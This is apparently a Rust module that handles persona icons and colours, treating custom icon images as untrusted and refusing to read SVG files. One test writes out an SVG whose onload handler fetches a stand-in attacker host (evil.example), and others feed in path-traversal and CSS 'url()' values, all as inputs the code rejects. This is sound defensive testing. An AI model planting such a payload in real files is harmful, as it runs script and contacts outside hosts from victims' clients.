//! **A persona's mark** (#1449): the icon and colour it is drawn with wherever it appears.
//!
//! A persona's definition may carry two keys, read with its `extends:` chain applied as every
//! other scalar key is:
//!
//! - `icon:`, one of [`ICONS`] — names the window already ships a glyph for, never a file;
//! - `color:`, in the vocabulary a workspace's colour has
//!   ([`crate::extension::project::theme::Colour`]): a palette name or `#rrggbb`.
//!
//! Its own folder may also hold a custom image, `icon.png` ([`IMAGE`]), which is drawn instead
//! of the built-in icon. With none of these the window draws the persona's initials on a
//! colour it derives from the name; that fallback is the window's, so a mark with nothing in
//! it is a complete answer.
//!
//! # A custom image is untrusted, and is a PNG
//!
//! A chat can edit its own persona's folder, so the image is whatever a chat wrote. Three
//! things hold it:
//!
//! 1. **It is read through the plane's containment**, never through a link, and never past
//!    [`MOST_IMAGE`] bytes.
//! 2. **It must start as a PNG.** Nothing else is handed over.
//! 3. **The window never makes it markup or a URL.** It is handed bytes and a media type, and
//!    decodes them onto a canvas (`app/src/PersonaMark.tsx`), which runs no script and fetches
//!    nothing.
//!
//! An image that is refused draws the initials, and [`Mark::trouble`] says why in a sentence
//! the persona's view shows.
//!
//! **An `icon.svg` is never read** ([`NOT_DRAWN`], D-1449-16). An SVG is a document that can
//! carry script and references, and the one way the window draws an image, decoding bytes onto
//! a canvas, is not known to take one in every system webview. So the file is only noticed:
//! the persona keeps its built-in icon or its initials, and its view says to save a PNG.

use std::io::Read as _;
use std::path::Path;

use base64::Engine as _;

use crate::extension::project::theme::{Colour, PALETTE};
use crate::personas;

/// The frontmatter key that names a built-in icon.
pub const ICON: &str = "icon";

/// The frontmatter key that gives the colour. One meaning: this one.
pub const COLOR: &str = "color";

/// The icons a persona may name. A closed set the window maps to glyphs it ships
/// (`app/src/PersonaMark.tsx`, held to this list by a test there), for the reason
/// [`crate::panel::Mark`] is one: a name can never become a read of a file.
pub const ICONS: [&str; 40] = [
    "anchor",
    "book",
    "bot",
    "briefcase",
    "bug",
    "chart",
    "clipboard",
    "cloud",
    "code",
    "compass",
    "cpu",
    "database",
    "eye",
    "flask",
    "git-branch",
    "globe",
    "graduation-cap",
    "hammer",
    "heart",
    "key",
    "leaf",
    "lightbulb",
    "lock",
    "mail",
    "map",
    "megaphone",
    "package",
    "palette",
    "pen",
    "rocket",
    "scale",
    "search",
    "server",
    "shield",
    "star",
    "terminal",
    "user",
    "users",
    "wrench",
    "zap",
];

/// The custom image a persona's folder may hold, by file name and media type.
pub const IMAGE: (&str, &str) = ("icon.png", "image/png");

/// A file a persona's folder may hold that is not drawn: noticed by its name, never opened.
pub const NOT_DRAWN: &str = "icon.svg";

/// What the persona's view says of a [`NOT_DRAWN`] file with no [`IMAGE`] beside it.
pub const SAVE_A_PNG: &str =
    "purlis draws a custom persona icon from icon.png. Save this image as a PNG.";

/// The most a custom image may be, in bytes. A mark is drawn at the size of a line of text;
/// past this a file is not an icon, and every mark crosses to the window with the rest.
pub const MOST_IMAGE: u64 = 64 * 1024;

/// A custom image that passed every check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Image {
    /// `image/png`.
    pub media: &'static str,
    pub bytes: Vec<u8>,
}

impl Image {
    /// The bytes as base64, which is how they cross to the window. Bytes and a media type,
    /// never a path or a URL: the window decodes them onto a canvas and loads nothing.
    pub fn base64(&self) -> String {
        base64::engine::general_purpose::STANDARD.encode(&self.bytes)
    }
}

/// What a persona is drawn with.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Mark {
    /// One of [`ICONS`], or `None`.
    pub icon: Option<&'static str>,
    /// A palette name or `#rrggbb`, as the definition holds it, or `None`.
    pub colour: Option<String>,
    /// The custom image, when the folder holds one that may be drawn.
    pub image: Option<Image>,
    /// Why something the persona asked for is not drawn, each a whole sentence.
    pub trouble: Vec<String>,
}

/// The mark of the persona `name` in the plane at `root`.
///
/// Never fails: a name purlis will not read, or a definition that does not load, has the
/// empty mark, which the window draws as initials.
pub fn mark(root: &Path, name: &str) -> Mark {
    let mut mark = Mark::default();
    if !personas::valid_name(name) {
        return mark;
    }
    let declared = declared(root, name);
    let value = |key: &str| {
        declared
            .iter()
            .rev()
            .find(|(k, _)| k == key)
            .map(|(_, v)| v.as_str())
    };
    if let Some(said) = value(ICON) {
        match ICONS.iter().find(|known| **known == said) {
            Some(known) => mark.icon = Some(known),
            None => mark.trouble.push(format!(
                "{} is not an icon purlis has, so {name} shows its initials. Pick one of the \
                 icons here.",
                personas::one_line(said)
            )),
        }
    }
    if let Some(said) = value(COLOR) {
        match Colour::parse(said) {
            Some(colour) => mark.colour = Some(colour.value()),
            None => mark.trouble.push(format!(
                "{} is not a colour purlis reads, so {name} keeps the colour of its name. Use \
                 {} or #rrggbb.",
                personas::one_line(said),
                PALETTE.join(", ")
            )),
        }
    }
    match image(root, name) {
        Ok(Some(image)) => mark.image = Some(image),
        // An SVG and no PNG: nothing is drawn from it and nothing is taken away for it. The
        // file is only stat-ed, so what it holds cannot matter.
        Ok(None) => {
            let svg = root.join("personas").join(name).join(NOT_DRAWN);
            if std::fs::symlink_metadata(svg).is_ok() {
                mark.trouble.push(SAVE_A_PNG.to_owned());
            }
        }
        Err(why) => {
            // The acceptance is "falls back to initials": a persona that asked for an image
            // and cannot have it is not quietly drawn as something else it also named.
            mark.icon = None;
            mark.trouble.push(why);
        }
    }
    mark
}

/// `name`'s scalar keys with its chain applied, root first so a child's line is the last.
fn declared(root: &Path, name: &str) -> Vec<(String, String)> {
    personas::lineage(root, name)
        .iter()
        .rev()
        .filter_map(|ancestor| personas::load(root, ancestor))
        .flatten()
        .filter(|(_, value)| !value.is_empty())
        .collect()
}

/// The custom image in `name`'s own folder: `None` when there is none, and the sentence why
/// when there is one purlis will not draw.
fn image(root: &Path, name: &str) -> Result<Option<Image>, String> {
    let dir = root.join("personas").join(name);
    let (file, media) = IMAGE;
    let path = dir.join(file);
    if std::fs::symlink_metadata(&path).is_err() {
        return Ok(None);
    }
    let instead = "so purlis shows the initials instead";
    let bytes = bounded(root, &path)
        .map_err(|why| format!("purlis could not read {file} ({why}), {instead}."))?
        .ok_or_else(|| {
            format!(
                "{file} is over the {} KB limit for an icon, {instead}.",
                MOST_IMAGE / 1024
            )
        })?;
    if !bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
        return Err(format!("{file} is not a PNG image, {instead}."));
    }
    Ok(Some(Image { media, bytes }))
}

/// `path` read whole when it is a plain file of at most [`MOST_IMAGE`] bytes with no link on
/// the way; `Ok(None)` when it is longer. Never reads past the bound, whatever the size said.
fn bounded(root: &Path, path: &Path) -> std::io::Result<Option<Vec<u8>>> {
    let open = crate::contain::open_no_link(root, path)?;
    if !open.metadata()?.file_type().is_file() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "it is not a plain file",
        ));
    }
    let mut bytes = Vec::new();
    open.take(MOST_IMAGE + 1).read_to_end(&mut bytes)?;
    Ok((bytes.len() as u64 <= MOST_IMAGE).then_some(bytes))
}

/// Writes `name`'s icon and colour into its own definition: each `Some` is set, each `None`
/// takes the key out, and every other line of the file is left as it was.
///
/// Refused, in a sentence, for a name purlis will not read, a definition that is not there, an
/// icon outside [`ICONS`], and a colour that is not one.
pub fn set(
    root: &Path,
    name: &str,
    icon: Option<&str>,
    colour: Option<&str>,
) -> Result<(), String> {
    if let Some(refused) = personas::name_refusal(root, name) {
        return Err(refused);
    }
    if let Some(icon) = icon
        && !ICONS.contains(&icon)
    {
        return Err(format!(
            "{} is not an icon purlis has.",
            personas::one_line(icon)
        ));
    }
    if let Some(colour) = colour
        && Colour::parse(colour).is_none()
    {
        return Err(format!(
            "{} is not a colour purlis reads. Use {} or #rrggbb.",
            personas::one_line(colour),
            PALETTE.join(", ")
        ));
    }
    let file = personas::def_path(root, name);
    crate::contain::writable(root, &file).map_err(|refused| refused.to_string())?;
    let could_not = |why: std::io::Error| {
        format!(
            "purlis could not write {name}'s definition ({why}). Its icon and colour are as \
             they were."
        )
    };
    let text = crate::contain::read_text_no_link(root, &file).map_err(could_not)?;
    let next = with_keys(&text, &[(ICON, icon), (COLOR, colour)]);
    if next == text {
        return Ok(());
    }
    crate::rewrite::replace(root, &file, next.as_bytes(), crate::rewrite::Mode::Kept)
        .map_err(could_not)
}

/// `text` with each of `keys` set to its value in the frontmatter, or taken out for `None`.
///
/// The frontmatter is cut where [`personas::frontmatter`] cuts it, so the writer and the
/// reader agree on what a key's line is. A key already there keeps its place; a new one goes
/// last. A text with no frontmatter gains one, and stays all body below it.
fn with_keys(text: &str, keys: &[(&str, Option<&str>)]) -> String {
    let cut = text
        .strip_prefix("---")
        .and_then(|rest| rest.find("---").map(|end| (&rest[..end], &rest[end..])));
    let (block, after) = match cut {
        Some(cut) => cut,
        None if keys.iter().all(|(_, value)| value.is_none()) => return text.to_owned(),
        None => ("\n", ""),
    };
    let key_of = |line: &str| {
        line.split_once(':')
            .map(|(key, _)| crate::memstore::py_strip(key).to_owned())
    };
    let mut lines: Vec<String> = block.lines().map(str::to_owned).collect();
    for (key, value) in keys {
        let said = value.map(|value| format!("{key}: {value}"));
        let at = lines
            .iter()
            .position(|line| key_of(line).as_deref() == Some(*key));
        // A repeated key: the last line wins for a reader, so every one of them goes and the
        // one written stands where the first was.
        lines.retain({
            let mut seen = false;
            move |line| {
                let mine = key_of(line).as_deref() == Some(*key);
                let keep = !mine || (!seen && said.is_some());
                seen |= mine;
                keep
            }
        });
        match (at, value) {
            (Some(at), Some(value)) => lines[at] = format!("{key}: {value}"),
            (None, Some(value)) => lines.push(format!("{key}: {value}")),
            (_, None) => {}
        }
    }
    let mut block = lines.join("\n");
    if !block.starts_with('\n') {
        block.insert(0, '\n');
    }
    if !block.ends_with('\n') {
        block.push('\n');
    }
    match cut {
        Some(_) => format!("---{block}{after}"),
        None => format!("---{block}---\n{text}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const PNG: &[u8] = b"\x89PNG\r\n\x1a\nrest";

    fn plane() -> tempfile::TempDir {
        tempfile::tempdir().expect("a directory")
    }

    fn persona(root: &Path, name: &str, definition: &str) -> std::path::PathBuf {
        let dir = root.join("personas").join(name);
        std::fs::create_dir_all(&dir).expect("a persona");
        std::fs::write(dir.join("persona.md"), definition).expect("a definition");
        dir
    }

    #[test]
    fn a_definitions_icon_and_colour_are_its_mark() {
        let plane = plane();
        persona(
            plane.path(),
            "devops",
            "---\nrole: Ops\nicon: rocket\ncolor: teal\n---\nbody\n",
        );

        let mark = mark(plane.path(), "devops");

        assert_eq!(mark.icon, Some("rocket"));
        assert_eq!(mark.colour.as_deref(), Some("teal"));
        assert_eq!(mark.image, None);
        assert_eq!(mark.trouble, Vec::<String>::new());
    }

    #[test]
    fn a_persona_that_says_nothing_has_the_empty_mark_the_window_draws_as_initials() {
        let plane = plane();
        persona(plane.path(), "qa", "---\nrole: QA\n---\n");

        assert_eq!(mark(plane.path(), "qa"), Mark::default());
        assert_eq!(mark(plane.path(), "nobody"), Mark::default());
        assert_eq!(mark(plane.path(), "../qa"), Mark::default());
    }

    #[test]
    fn a_colour_is_a_workspaces_vocabulary_a_palette_name_or_a_hex() {
        let plane = plane();
        persona(plane.path(), "a", "---\ncolor: #1a2b3c\n---\n");
        persona(plane.path(), "b", "---\ncolor: cyan\nicon: unicorn\n---\n");

        assert_eq!(mark(plane.path(), "a").colour.as_deref(), Some("#1a2b3c"));
        let odd = mark(plane.path(), "b");
        assert_eq!((odd.icon, odd.colour.as_deref()), (None, None));
        assert_eq!(
            odd.trouble,
            vec![
                "unicorn is not an icon purlis has, so b shows its initials. Pick one of the \
                 icons here."
                    .to_owned(),
                "cyan is not a colour purlis reads, so b keeps the colour of its name. Use red, \
                 orange, yellow, green, teal, blue, purple, pink or #rrggbb."
                    .to_owned(),
            ]
        );
    }

    #[test]
    fn a_child_is_drawn_as_its_parent_until_it_says_otherwise() {
        let plane = plane();
        persona(plane.path(), "base", "---\nicon: shield\ncolor: red\n---\n");
        persona(
            plane.path(),
            "child",
            "---\nextends: base\ncolor: blue\n---\n",
        );

        let mark = mark(plane.path(), "child");

        assert_eq!(mark.icon, Some("shield"));
        assert_eq!(mark.colour.as_deref(), Some("blue"));
    }

    #[test]
    fn a_custom_png_in_the_folder_is_the_mark_as_bytes_and_a_media_type() {
        let plane = plane();
        let dir = persona(plane.path(), "devops", "---\nicon: rocket\n---\n");
        std::fs::write(dir.join("icon.png"), PNG).expect("an image");

        let mark = mark(plane.path(), "devops");

        let image = mark.image.expect("the image");
        assert_eq!(image.media, "image/png");
        assert_eq!(image.bytes, PNG);
        assert_eq!(image.base64(), "iVBORw0KGgpyZXN0");
        assert_eq!(mark.icon, Some("rocket"), "what it falls back to");
        assert_eq!(mark.trouble, Vec::<String>::new());
    }

    #[test]
    fn a_png_is_read_when_it_starts_as_one_and_refused_when_it_does_not() {
        let plane = plane();
        let real = persona(plane.path(), "real", "---\n---\n");
        std::fs::write(real.join("icon.png"), PNG).expect("an image");
        let fake = persona(plane.path(), "fake", "---\n---\n");
        std::fs::write(fake.join("icon.png"), b"<html>").expect("a file");

        assert_eq!(
            mark(plane.path(), "real").image.map(|image| image.media),
            Some("image/png")
        );
        let refused = mark(plane.path(), "fake");
        assert_eq!(refused.image, None);
        assert_eq!(
            refused.trouble,
            vec!["icon.png is not a PNG image, so purlis shows the initials instead.".to_owned()]
        );
    }

    #[test]
    fn an_image_over_the_limit_is_not_read_and_the_mark_is_initials_with_the_reason() {
        let plane = plane();
        let dir = persona(
            plane.path(),
            "devops",
            "---\nicon: rocket\ncolor: teal\n---\n",
        );
        let big = [PNG, &vec![0; MOST_IMAGE as usize]].concat();
        std::fs::write(dir.join("icon.png"), big).expect("an image");

        let mark = mark(plane.path(), "devops");

        assert_eq!(mark.image, None);
        assert_eq!(mark.icon, None, "initials, not the built-in it also named");
        assert_eq!(mark.colour.as_deref(), Some("teal"));
        assert_eq!(
            mark.trouble,
            vec![
                "icon.png is over the 64 KB limit for an icon, so purlis shows the initials \
                 instead."
                    .to_owned()
            ]
        );
    }

    #[cfg(unix)]
    #[test]
    fn an_image_that_is_a_link_is_never_followed() {
        let plane = plane();
        let outside = tempfile::tempdir().expect("a directory");
        std::fs::write(outside.path().join("secret.png"), PNG).expect("a file");
        let dir = persona(plane.path(), "devops", "---\n---\n");
        std::os::unix::fs::symlink(outside.path().join("secret.png"), dir.join("icon.png"))
            .expect("a link");

        let mark = mark(plane.path(), "devops");

        assert_eq!(mark.image, None);
        assert_eq!(mark.trouble.len(), 1);
        assert!(
            mark.trouble[0].starts_with("purlis could not read icon.png ("),
            "{:?}",
            mark.trouble
        );
    }

    #[test]
    fn an_svg_in_the_folder_is_never_read_and_the_view_says_to_save_a_png() {
        let plane = plane();
        let dir = persona(
            plane.path(),
            "devops",
            "---\nicon: rocket\ncolor: teal\n---\n",
        );
        std::fs::write(
            dir.join("icon.svg"),
            r#"<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.example')"/>"#,
        )
        .expect("an image");

        let mark = mark(plane.path(), "devops");

        assert_eq!(mark.image, None);
        assert_eq!(
            mark.icon,
            Some("rocket"),
            "it keeps the built-in icon it named"
        );
        assert_eq!(
            mark.trouble,
            vec![
                "purlis draws a custom persona icon from icon.png. Save this image as a PNG."
                    .to_owned()
            ]
        );
    }

    #[cfg(unix)]
    #[test]
    fn an_svg_that_cannot_even_be_opened_is_still_only_noticed() {
        // A link out of the plane, to nothing: were the file opened, this would be a refusal
        // or an error. It is the same sentence, because the file is never opened.
        let plane = plane();
        let dir = persona(plane.path(), "devops", "---\n---\n");
        std::os::unix::fs::symlink("/nowhere/at/all.svg", dir.join("icon.svg")).expect("a link");

        assert_eq!(
            mark(plane.path(), "devops").trouble,
            vec![SAVE_A_PNG.to_owned()]
        );
    }

    #[test]
    fn a_png_beside_an_svg_is_drawn_and_nothing_is_said_about_the_svg() {
        let plane = plane();
        let dir = persona(plane.path(), "devops", "---\n---\n");
        std::fs::write(dir.join("icon.svg"), "<svg/>").expect("a file");
        std::fs::write(dir.join("icon.png"), PNG).expect("an image");

        let mark = mark(plane.path(), "devops");

        assert_eq!(mark.image.map(|image| image.media), Some("image/png"));
        assert_eq!(mark.trouble, Vec::<String>::new());
    }

    #[test]
    fn a_pick_is_written_into_the_definition_and_every_other_line_stays() {
        let plane = plane();
        let dir = persona(
            plane.path(),
            "devops",
            "---\nname: devops\nrole: Ops\ndelegate-when: deploys\n---\n\n# devops\n\n---\nmore\n",
        );

        set(plane.path(), "devops", Some("rocket"), Some("teal")).expect("written");

        assert_eq!(
            std::fs::read_to_string(dir.join("persona.md")).expect("the file"),
            "---\nname: devops\nrole: Ops\ndelegate-when: deploys\nicon: rocket\ncolor: teal\n\
             ---\n\n# devops\n\n---\nmore\n"
        );
        let mark = mark(plane.path(), "devops");
        assert_eq!(
            (mark.icon, mark.colour.as_deref()),
            (Some("rocket"), Some("teal"))
        );
    }

    #[test]
    fn a_pick_replaces_the_line_where_it_was_and_none_takes_it_out() {
        let plane = plane();
        let dir = persona(
            plane.path(),
            "qa",
            "---\nicon: bug\nrole: QA\ncolor: red\ncolor: blue\n---\nbody\n",
        );
        let read = || std::fs::read_to_string(dir.join("persona.md")).expect("the file");

        set(plane.path(), "qa", Some("flask"), Some("#00ff00")).expect("written");
        assert_eq!(
            read(),
            "---\nicon: flask\nrole: QA\ncolor: #00ff00\n---\nbody\n"
        );

        set(plane.path(), "qa", None, None).expect("written");
        assert_eq!(read(), "---\nrole: QA\n---\nbody\n");
    }

    #[test]
    fn a_definition_with_no_frontmatter_gains_one_and_keeps_its_body() {
        let plane = plane();
        let dir = persona(plane.path(), "plain", "# plain\n");

        set(plane.path(), "plain", Some("star"), None).expect("written");

        assert_eq!(
            std::fs::read_to_string(dir.join("persona.md")).expect("the file"),
            "---\nicon: star\n---\n# plain\n"
        );
    }

    #[test]
    fn a_pick_outside_the_vocabulary_or_for_nobody_is_refused_and_nothing_is_written() {
        let plane = plane();
        let dir = persona(plane.path(), "qa", "---\nrole: QA\n---\n");

        assert_eq!(
            set(plane.path(), "qa", Some("../../x"), None),
            Err("../../x is not an icon purlis has.".to_owned())
        );
        assert_eq!(
            set(plane.path(), "qa", None, Some("url(x)")),
            Err(
                "url(x) is not a colour purlis reads. Use red, orange, yellow, green, teal, \
                 blue, purple, pink or #rrggbb."
                    .to_owned()
            )
        );
        assert!(set(plane.path(), "nobody", Some("star"), None).is_err());
        assert_eq!(
            std::fs::read_to_string(dir.join("persona.md")).expect("the file"),
            "---\nrole: QA\n---\n"
        );
    }

    #[test]
    fn the_icons_are_sorted_and_named_once() {
        let mut sorted = ICONS.to_vec();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(sorted, ICONS.to_vec());
    }
}
